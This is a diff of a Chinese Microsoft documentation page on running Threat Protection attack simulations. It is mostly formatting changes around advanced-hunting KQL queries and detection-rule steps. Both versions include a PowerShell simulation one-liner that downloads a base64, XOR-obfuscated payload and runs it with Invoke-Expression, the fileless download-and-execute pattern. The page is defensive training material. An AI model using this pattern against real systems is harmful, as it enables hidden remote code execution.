@@ -17,14 +17,15 @@ manager: dansimp
 audience: ITPro
 ms.collection:
 - M365-security-compliance
-- m365solution-evalutatemtp
+- m365solution-scenario
+- m365solution-pilotmtpproject
 ms.topic: conceptual
-ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
-ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
+ms.openlocfilehash: f165a34d5e9df2f3502a9d9c6230fed9b73b758b
+ms.sourcegitcommit: a83acd5b9eeefd2e20e5bac916fe29d09fb53de9
 ms.translationtype: MT
 ms.contentlocale: zh-CN
-ms.lasthandoff: 10/06/2020
-ms.locfileid: "48368089"
+ms.lasthandoff: 10/10/2020
+ms.locfileid: "48418141"
 ---
 # <a name="run-your-microsoft-threat-protection-attack-simulations"></a>运行 Microsoft 威胁防护攻击模拟  
 
@@ -92,21 +93,23 @@ ms.locfileid: "48368089"
 由于你已在准备阶段配置了试点环境，因此请确保在此方案中有两个设备：测试设备和域控制器。
 
 1.  验证你的租户是否已启用 microsoft 威胁 [防护](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)。
+
 2.  验证测试域控制器配置：
+
     - 使用 Windows Server 2008 R2 或更高版本运行的设备。
     - 测试域控制器到 [Azure 高级威胁防护](https://docs.microsoft.com/azure/security-center/security-center-wdatp) 并启用 [远程管理](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)。    
     - 验证 [AZURE ATP 和 Microsoft 云应用安全集成](https://docs.microsoft.com/cloud-app-security/aatp-integration) 是否已启用。
     - 在您的域中创建一个测试用户–不需要管理员权限。
 
 3.  验证测试设备配置：
-    <br>
-    a.  使用 Windows 10 版本1903或更高版本运行的设备。
-    <br>
-    b.  测试设备已加入测试域。
-    <br>
-    c.  [启用 Windows Defender 防病毒](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 如果你在启用 Windows Defender 防病毒时遇到问题，请参阅此 [故障排除主题](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
-    <br>
-    d.  验证测试设备是否 [载入到 Microsoft Defender 高级威胁防护 (MDATP) ](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。
+ 
+    1.  使用 Windows 10 版本1903或更高版本运行的设备。
+    
+    1.  测试设备已加入测试域。
+    
+    1.  [启用 Windows Defender 防病毒](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)。 如果你在启用 Windows Defender 防病毒时遇到问题，请参阅此 [故障排除主题](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)。
+    
+    1.  验证测试设备是否 [载入到 Microsoft Defender 高级威胁防护 (MDATP) ](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。
 
 如果使用现有租户并实现设备组，请为测试设备创建专用设备组，并将其推送到配置 UX 中的顶层。
 
@@ -120,15 +123,17 @@ ms.locfileid: "48368089"
 2.  在测试设备上打开 Windows PowerShell 窗口。
 
 3.  复制以下模拟脚本：
-```
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
-= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
--UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-```
->[!NOTE]
->如果您在 web 浏览器上打开此文档，则在复制整个文本时可能会遇到问题，而不会丢失某些字符或引入额外的换行符。 下载此文档并在 Adobe Reader 中打开它。
+
+    ```powershell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
+    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
+    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+    
+    > [!NOTE]
+    > 如果您在 web 浏览器上打开此文档，则在复制整个文本时可能会遇到问题，而不会丢失某些字符或引入额外的换行符。 下载此文档并在 Adobe Reader 中打开它。
 
 4. 在提示符处，粘贴并运行复制的脚本。
 
@@ -141,7 +146,7 @@ $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encodin
 
 此脚本完成后，你将看到 PowerShell 控制台上显示一条消息。
 
-```
+```console
 ran NetSessionEnum against [DC Name] with return code result 0      
 ```
 
@@ -333,96 +338,98 @@ Microsoft Defender ATP 检测通常针对攻击技术的最常见属性。 这�
 
 **"转到"**
 1.  打开 security.microsoft.com 门户。
+
 2.  导航到 " **> 高级搜寻**" 中的 "搜寻"。
 
     ![M365 安全中心门户导航栏中高级搜寻的屏幕截图](../../media/mtp/fig17.png) 
 
 3.  生成通过收集电子邮件事件开始的查询。
-    a.  在查询窗格中，选择 "新建"。
-    b.  在架构中，双击 "EmailEvents" 表。
 
-```
-EmailEvents 
-```                                        
+    1.  在查询窗格中，选择 "新建"。
+    
+    1.  在架构中，双击 "EmailEvents" 表。
 
-   c.   将时间范围更改为最近24小时。 假定运行上述模拟时发送的电子邮件为过去的24小时，则更改时间范围。
-   ![可在其中更改时间范围的屏幕截图。 打开下拉菜单以从 "时间框架的范围" 选项中选择](../../media/mtp/fig18.png) 
+        ```
+        EmailEvents 
+        ```                                        
 
+    1.  将时间范围更改为最近24小时。 假定运行上述模拟时发送的电子邮件为过去的24小时，则更改时间范围。
+    
+        ![可在其中更改时间范围的屏幕截图。 打开下拉菜单以从 "时间框架的范围" 选项中选择](../../media/mtp/fig18.png) 
 
-   d.   运行查询。  你可能会有许多结果，具体取决于试点的环境。  
+    1.  运行查询。  你可能会有许多结果，具体取决于试点的环境。  
 
->[!NOTE]
->有关筛选选项以限制数据返回的详细步骤，请参阅下一步。
+        > [!NOTE]
+        > 有关筛选选项以限制数据返回的详细步骤，请参阅下一步。
 
-   ![高级搜寻查询结果的屏幕截图](../../media/mtp/fig19.png) 
+        ![高级搜寻查询结果的屏幕截图](../../media/mtp/fig19.png) 
 
->[!NOTE]
->高级搜寻将查询结果显示为表格数据。 您还可以选择查看其他格式类型（如图表）中的数据。    
+        > [!NOTE]
+        > 高级搜寻将查询结果显示为表格数据。 您还可以选择查看其他格式类型（如图表）中的数据。    
 
-   e.   查看结果，并查看是否可以识别您打开的电子邮件。  最长可能需要2小时的时间才能在高级搜寻中显示邮件。 如果电子邮件环境很大且结果很多，则可能需要使用 " **显示筛选器" 选项** 来查找邮件。 
+    1.  查看结果，并查看是否可以识别您打开的电子邮件。  最长可能需要2小时的时间才能在高级搜寻中显示邮件。 如果电子邮件环境很大且结果很多，则可能需要使用 " **显示筛选器" 选项** 来查找邮件。 
 
-   在示例中，电子邮件是从 Yahoo 帐户发送的。 单击 **+** "SenderFromDomain" 部分下 " **yahoo.com** " 旁边的图标，然后单击 " **应用** " 将所选的域添加到查询中。  应使用在运行模拟以筛选结果的步骤1中用于发送测试邮件的域或电子邮件帐户。  再次运行查询以获取一个较小的结果集，以验证您是否可以从模拟中看到该消息。
+        在示例中，电子邮件是从 Yahoo 帐户发送的。 单击 **+** "SenderFromDomain" 部分下 " **yahoo.com** " 旁边的图标，然后单击 " **应用** " 将所选的域添加到查询中。  应使用在运行模拟以筛选结果的步骤1中用于发送测试邮件的域或电子邮件帐户。  再次运行查询以获取一个较小的结果集，以验证您是否可以从模拟中看到该消息。
    
-   ![筛选器的屏幕截图。 使用筛选器缩小搜索范围，并更快地找到要查找的内容。](../../media/mtp/fig20.png) 
+        ![筛选器的屏幕截图。 使用筛选器缩小搜索范围，并更快地找到要查找的内容。](../../media/mtp/fig20.png) 
 
+        ```console
+        EmailEvents 
+        | where SenderMailFromDomain == "yahoo.com"
+        ```
 
-```
-EmailEvents 
-| where SenderMailFromDomain == "yahoo.com"
-```
-
-   f.   单击查询中的结果行，以便您可以检查记录。
-   ![当选择高级搜索结果时，将打开的检查记录侧面板的屏幕截图](../../media/mtp/fig21.png) 
-
+    1.  单击查询中的结果行，以便您可以检查记录。
+   
+        ![当选择高级搜索结果时，将打开的检查记录侧面板的屏幕截图](../../media/mtp/fig21.png) 
 
 4.  现在，您已经验证您可以看到电子邮件，添加了附件的筛选器。 将重点放在环境中具有附件的所有电子邮件上。 在这种情况下，重点关注的是入站电子邮件，而不是从您的环境发出的电子邮件。 删除您已添加的任何筛选器，以查找您的邮件并添加 "|其中， **AttachmentCount > 0**和**EmailDirection**  ==  **"Inbound" "**
 
-以下查询将向您显示结果与所有电子邮件事件的初始查询的列表相比：
+    以下查询将向您显示结果与所有电子邮件事件的初始查询的列表相比：
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
 
-```
+    ```
 
 5.  接下来，包括有关附件的信息 (例如：文件名、哈希) 到结果集。 若要执行此操作，请加入 **EmailAttachmentInfo** 表。 用于加入的公共字段，在此示例中为 **NetworkMessageId** 和 **RecipientObjectId**。
 
-以下查询还包括其他行 "| **project-Rename EmailTimestamp = Timestamp**"，它将帮助识别与您将在下一步中添加的文件操作相关的电子邮件和时间戳相关的时间戳。
+    以下查询还包括其他行 "| **project-Rename EmailTimestamp = Timestamp**"，它将帮助识别与您将在下一步中添加的文件操作相关的电子邮件和时间戳相关的时间戳。
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    ```
 
 6.  接下来，使用**EmailAttachmentInfo**表中的**SHA256**值查找该哈希的终结点) 上发生的**DeviceFileEvents** (文件操作。  此处的公共字段将成为附件的 SHA256 哈希。
 
-生成的表格现在包含来自终结点的详细信息 (Microsoft Defender ATP) 例如设备名称、在这种情况下 (执行了什么操作、筛选为仅包括 FileCreated 事件) 以及存储文件的位置。 此外，还将包括与进程关联的帐户名称。
+    生成的表格现在包含来自终结点的详细信息 (Microsoft Defender ATP) 例如设备名称、在这种情况下 (执行了什么操作、筛选为仅包括 FileCreated 事件) 以及存储文件的位置。 此外，还将包括与进程关联的帐户名称。
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId 
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    ```
 
-现在，您已创建一个查询，该查询将标识用户在其中打开或保存了附件的所有入站电子邮件。 您还可以优化此查询以筛选特定的发件人域、文件大小、文件类型等。
+    现在，您已创建一个查询，该查询将标识用户在其中打开或保存了附件的所有入站电子邮件。 您还可以优化此查询以筛选特定的发件人域、文件大小、文件类型等。
 
 7.  函数是一种特殊的联接，可让您获取有关文件的更多 TI 数据，如文件的流行、签名者信息等。 若要获取有关该文件的更多详细信息，请使用 **FileProfile ( # B1 ** function 扩充：
 
-```
-EmailEvents 
-| where AttachmentCount > 0 and EmailDirection == "Inbound"
-| project-rename EmailTimestamp=Timestamp 
-| join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
-| join DeviceFileEvents on SHA256 
-| where ActionType == "FileCreated"
-| distinct SHA1
-| invoke FileProfile()
-```
+    ```console
+    EmailEvents 
+    | where AttachmentCount > 0 and EmailDirection == "Inbound"
+    | project-rename EmailTimestamp=Timestamp 
+    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
+    | join DeviceFileEvents on SHA256 
+    | where ActionType == "FileCreated"
+    | distinct SHA1
+    | invoke FileProfile()
+    ```
 
 
 **创建检测**
@@ -435,15 +442,15 @@ EmailEvents
     
     ![可在 "高级搜寻" 页面中单击 "创建检测规则" 的位置的屏幕截图](../../media/mtp/fig22.png) 
 
->[!NOTE]
->如果单击 " **创建检测规则** " 并在查询中出现语法错误，则不会保存您的检测规则。 请仔细检查您的查询以确保没有错误。 
+    > [!NOTE]
+    > 如果单击 " **创建检测规则** " 并在查询中出现语法错误，则不会保存您的检测规则。 请仔细检查您的查询以确保没有错误。 
 
 
 2.  填写必需的字段，其中包含的信息将允许安全团队了解警报、生成它的原因以及预期采取的操作。 
 
     !["创建检测规则" 页的屏幕截图，可在其中定义警报详细信息](../../media/mtp/fig23.png)
 
-确保明确填写字段，以帮助下一用户获得有关此检测规则警报的明智决策 
+    确保明确填写字段，以帮助下一用户获得有关此检测规则警报的明智决策 
 
 3.  选择此通知中受影响的实体。 在这种情况下，选择 " **设备** 和 **邮箱**"。
 
@@ -458,7 +465,7 @@ EmailEvents
 
     !["创建检测规则" 页的屏幕截图，您可以在其中设置警报规则的作用域，以管理您对将看到的结果的预期](../../media/mtp/fig26.png) 
 
-对于此试点，您可能希望将此规则限制为生产环境中的一小部分测试设备。
+    对于此试点，您可能希望将此规则限制为生产环境中的一小部分测试设备。
 
 6.  选择 **“创建”**。 然后，从导航面板中选择 " **自定义检测规则** "。
  
@@ -466,9 +473,9 @@ EmailEvents
 
     ![显示规则和执行详细信息的 "检测规则" 页的屏幕截图](../../media/mtp/fig27b.png) 
 
-在此页面中，您可以选择将打开 "详细信息" 页的检测规则。 
+    在此页面中，您可以选择将打开 "详细信息" 页的检测规则。 
 
-!["电子邮件附件" 页面的屏幕截图，可在其中查看规则执行状态、触发通知和操作、编辑检测等情况](../../media/mtp/fig28.png) 
+    !["电子邮件附件" 页面的屏幕截图，可在其中查看规则执行状态、触发通知和操作、编辑检测等情况](../../media/mtp/fig28.png) 
 
 ### <a name="additional-advanced-hunting-walk-through-exercises"></a>其他高级的搜寻指导-通过练习
 
@@ -477,7 +484,7 @@ EmailEvents
 >[!NOTE]
 >请使用你自己的 GitHub 帐户进行准备，以在试点测试实验室环境中运行搜寻查询。  
 
-| **标题** | **说明** | **下载文件关于** | **在 YouTube 上观看** | **要使用的 CSL 文件** |
+|  标题  |  说明  |  下载文件关于  |  在 YouTube 上观看  |  要使用的 CSL 文件  |
 |:-----|:-----|:-----|:-----|:-----|
 | 剧集1： KQL 基础知识 | 我们将介绍 Microsoft 威胁防护中的高级搜寻功能的基础知识。 了解可用的高级搜寻数据和基本 KQL 语法和运算符。 | [ MP4](https://aka.ms/MTP15JUL20_MP4) | [YouTube](https://youtu.be/0D9TkGjeJwM) | [剧集1： Git 中的 CSL 文件](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
 | 剧集2：联接 | 我们将继续了解高级搜寻中的数据，以及如何将表格联接在一起。 了解内部、外部、唯一和半连接，以及默认 Kusto innerunique join 的细微差别。 | [MP4](https://aka.ms/MTP22JUL20_MP4) | [YouTube](https://youtu.be/LMrO6K5TWOU) | [剧集2： Git 中的 CSL 文件](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
